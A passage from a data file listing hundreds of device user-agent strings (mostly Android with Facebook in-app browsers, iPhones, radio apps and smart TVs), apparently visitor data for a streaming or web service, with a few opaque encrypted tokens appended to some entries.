FXM-U2FsdGVkX19MIVA+9lrf7BLZ30gi9cUaGrF+a6785htUUFk6h0yZWeMj6TPGiXj0-END","Mozilla/5.0 (Linux; Android 12; moto e32(s)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36 OPR/40.0.2207.0 OMI/4.9.0.237.Martell-2.312 Model/Hisense-MT5658-SDK4-9 MT5658 (;Hisense;SmartTV;V0000.01.00a.J0211;HE43A6500UWTS) FXM-U2FsdGVkX1+f9qVOYzTR+ABkCEfhCyfJBEGUxFuDy35sKBKWUY9kcT3gSUeJ6N3+-END","Mozilla/5.0 (Linux; Android 13; SM-A725M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 11; M2101K7AG Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]","Mozilla/5.0 (Linux; Android 11; T775H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","AppleCoreMedia/1.0.0.20E252 (iPad; U; CPU OS 16_4_1 like Mac OS X; hu_hu)","Mozilla/5.0 (Linux; Android 7.0; SM-G928F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; Mi 9 Lite Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; Nokia 7 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A525F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-G7810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; moto g(8) plus Build/QPIS30.28-Q3-28-26-4-1-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 6.0.1; SM-G800H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-20)","Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2207.0 OMI/4.11.3.57.Martell-3.133 Model/Hisense-MT5659-SDK4-11 (;Hisense;SmartTV;V0100.01.00A.M0111;HE40E5600FFWTS) FXM-U2FsdGVkX1/qlcUrH72Ukm8CqzoFPRWiZ+yqfA+Fy7eS+NMa6FJ2aDcuP1T5IMSO-END","Mozilla/5.0 (Linux; Android 10; M2002J9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 9; ZTE Blade A5 2019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; B3-A40 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 10; SM-A920F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 11; TW102) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2145 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/349.0.0.8.103;]","Mozilla/5.0 (Linux; Android 8.0.0; MHA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","TuneIn Radio Pro/25.2.1; iPad8,9; iPadOS/16.4","Mozilla/5.0 (Linux; Android 12; 2201122G Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 7.0; AGS-W09 Build/HUAWEIAGS-W09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.1.0; View2 Go Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 9; VTR-L09; HMSCore 6.10.0.311; GMSCore 23.11.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.3.301 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-N960U1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; SM-M205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; 2203129G Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A546B/A546BXXU1AWB7) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; SM-M135M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; LG-H930) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; LM-Q610.FGN Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]","Mozilla/5.0 (Linux; Android 7.0; P027 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; TECNO CF7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36","Simple%20Radio/1939 CFNetwork/1126 Darwin/19.5.0","Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 EdgA/111.0.1661.59","Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; moto g62 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPhone10,1; iOS/16.3.1","Mozilla/5.0 (Linux; Android 12; Pixel 3 XL Build/SP1A.210812.016.C1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro Build/TQ2A.230305.008.C1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPad14,3; iPadOS/16.4","Mozilla/5.0 (Linux; Android 8.1.0; Infinix X623) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; M2007J17G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/349.0.0.8.103;]","TuneIn Radio Pro/25.2.1; iPhone10,5; iOS/16.3.1","Mozilla/5.0 (Linux; Android 12; SM-G781B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; FIG-LX1 Build/HUAWEIFIG-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; CPH2015 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH2127 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]","AppleCoreMedia/1.0.0.20E252 (iPhone; U; CPU OS 16_4_1 like Mac OS X; hu_hu)","Mozilla/5.0 (Linux; Android 9; LYA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone14,6;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 277.1.0.20.110 (iPhone11,6; iOS 14_8_1; it_IT; it-IT; scale=3.00; 1242x2688; 462633398) NW/3","Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; 2201116SG Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 GNews Android/2022060972","AppleCoreMedia/1.0.0.20E252 (iPhone; U; CPU OS 16_4_1 like Mac OS X; fr_be)","Mozilla/5.0 (Linux; Android 13; SM-M336BU Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; moto e(7) plus Build/QPZS30.30-Q3-38-69-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBAV/407.1.0.42.94;FBBV/458594382;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/463586505]","Mozilla/5.0 (Linux; Android 12; SM-G975F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; moto g(30) Build/S0RCS32.41-10-19-14; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; moto g(8) Build/RPJS31.Q4U-47-35-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-A315G Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 11; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPad6,11; iPadOS/16.3.1","Mozilla/5.0 (Linux; Android 9; Redmi 7A Build/PKQ1.190319.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; SM-A505FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; RMX3393 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; moto g(10) Build/RRBS31.Q1-3-48-20; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; J9210 Build/55.2.A.4.332) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-M325FV Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; G8341 Build/47.2.A.11.228; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; LEX821 Build/RQ3A.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; RMX3511 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; LM-X320 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 10; STK-L21 Build/HUAWEISTK-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; M1908C3JGG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPad6,12;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]","Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ2A.230305.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-S906B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120654","Mozilla/5.0 (Linux; Android 13; LE2123 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.6.115;]","Mozilla/5.0 (Linux; Android 10; SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Dalvik/2.1.0 (Linux; U; Android 11; Ticktock Build/RP1A.200720.011)","Mozilla/5.0 (Linux; Android 11; 2201117TY Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; CPH2409) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A507FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; SM-F721B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; LM-Q630 Build/RKQ1.210420.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.1.1; iPhone14,4; iOS/16.4.1","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 7.0; SM-G928F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","AppleCoreMedia/1.0.0.20J8378 (Apple TV; U; CPU OS 16_0 like Mac OS X; de_ch)","Simple%20Radio/1954 CFNetwork/1325.0.1 Darwin/21.1.0","Mozilla/5.0 (Linux; Android 12; motorola edge 30 Build/S1RDS32.55-106-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","TuneIn Radio/25.2.1; iPhone15,2; iOS/16.1","Mozilla/5.0 (Linux; Android 12; CPH2339 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 GNews Android/2022091350","Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; S40Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 10; Nokia 3.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]","Mozilla/5.0 (Linux; Android 12; SM-A325F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 13; CPH2145 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPhone13,4; iOS/16.1.1","Mozilla/5.0 (Linux; Android 11; J9210) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; moto e32 Build/ROR31.335-28; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; LM-G810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3363 Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; SM-A307FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 277.0.0.18.110 (iPhone12,8; 